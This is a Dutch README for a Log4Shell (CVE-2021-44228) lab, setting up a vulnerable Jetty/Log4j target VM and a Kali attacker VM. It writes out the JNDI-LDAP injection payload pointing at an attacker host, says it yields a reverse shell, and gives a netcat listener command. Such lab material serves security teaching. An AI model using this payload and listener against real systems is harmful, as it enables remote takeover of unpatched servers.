# Log4Shell Demonstratie (CVE-2021-44228)

Deze demo toont hoe de Log4Shell-kwetsbaarheid werkt door een gesplitste omgeving op te zetten met een **target machine (Debian)** en een **attacker machine (Kali Linux)**.

---

## 🖥️ Target VM (Debian)
Bevat de kwetsbare Java-webapp met Log4j 2.14.1.

### Vereisten:
- Debian/Ubuntu
- Java JDK

### Stappen:
Open op je VM een terminal, je zal zien dat in je home directory een file CyberSec25 aanwezig is.
```bash
cd CyberSec25/scripts
chmod +x setup_target.sh
sudo ./setup_target.sh
```
Het script zal de nodige libraries installeren om een jetty webapplicatie op te stellen.

Deze wordt vervolgens gehost op: [http://localhost:8080].

Je target VM is opgezet.
---

## ⚔️ Attacker VM (Kali)
Start een LDAP- en HTTP-server om een exploit via JNDI te leveren.

### Vereisten:
- Kali Linux
- Java JDK
- Python3

### Stappen:
```bash
cd CyberSec25/scripts
chmod +x setup_attacker.sh
./setup_attacker.sh
```

Gebruik de volgende payload in het formulier op de target:
```text
${jndi:ldap://<attacker-ip>:1389/a}
```
- jndi = een Java API waarmee je objecten kunt opzoeken
- ldap:// = het protocol
- 10.0.2.5 = IP van de aanvaller / LDAP-server
- :1389 = standaard poort voor LDAP
- /a = zoekpad of zoek-id in de LDAP-directory

De exploit zal een reverse-shell starten vanop de target VM.
Hiervoor moeten we een listener opzetten:
```bash
nc -lvnp 4444
```
---

## 📁 Structuur
```
CyberSec25/
├── exploit/         # Exploit.java
├── ldap/            # LDAPServer.java (UnboundID)
├── webapp/          # Jetty + Log4j kwetsbare app
├── scripts/
│   ├── setup_target.sh
│   └── setup_attacker.sh
├── log4j2.xml
└── test_payload.txt
```

## ⚠️ Disclaimer
Gebruik dit enkel in een veilige testomgeving. De auteur is niet verantwoordelijk voor verkeerd gebruik.
